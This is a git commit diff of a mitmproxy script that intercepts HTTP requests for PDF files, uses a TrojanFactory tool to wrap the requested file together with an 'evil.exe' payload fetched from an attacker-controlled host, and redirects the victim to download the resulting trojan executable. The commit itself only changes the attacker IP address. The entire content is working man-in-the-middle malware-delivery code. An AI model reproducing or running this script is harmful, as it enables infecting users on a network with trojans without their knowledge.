8d3654ad86a655aa9098b750256988d84f9c268e
zubsingh <30393053+zubsingh@users.noreply.github.com>
2023-12-24 21:01:03 +0530

    Update mitmproxy_replace_pdf_with_trojan.py

--- mitmproxy_replace_pdf_with_trojan.py
+++ mitmproxy_replace_pdf_with_trojan.py
@@ -21,11 +21,11 @@ import subprocess
 
 def request(flow):
 	
-	if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
+	if flow.request.host != "192.168.138.118" and flow.request.pretty_url.endswith(".pdf"):
 		print("[+] Got interesting flow")
 		
 		front_file = flow.request.pretty_url + "#"
-		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
+		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://192.168.138.118/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
 		
 		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://192.168.138.118/file.exe"})
 	
